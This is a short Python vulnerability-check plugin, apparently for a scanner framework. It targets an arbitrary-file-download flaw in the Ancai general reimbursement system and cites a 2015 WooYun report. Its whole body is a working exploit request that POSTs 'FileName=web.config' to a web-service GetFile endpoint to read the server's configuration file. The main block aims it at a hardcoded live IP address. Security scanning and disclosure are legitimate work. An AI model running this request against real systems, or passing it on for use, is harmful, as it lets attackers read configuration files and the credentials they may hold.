#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 安财软件通用报销系统任意文件下载4
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0121651
#Author:xq17
def assign(service, arg):
    if service == "acsoft":
        return True, arg

def audit(arg):
    payload = arg + "WS/WebService.asmx/GetFile"
    data = 'VirtualPath=&FileName=web.config'
    code, head, res, errcode, _ = curl.curl2(payload,post=data)
    if code ==200 and 'base64Binary' in res:
        #base可解码
         security_hole(payload+':Any reading ' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('acsoft','http://122.224.179.212:8000/')[1])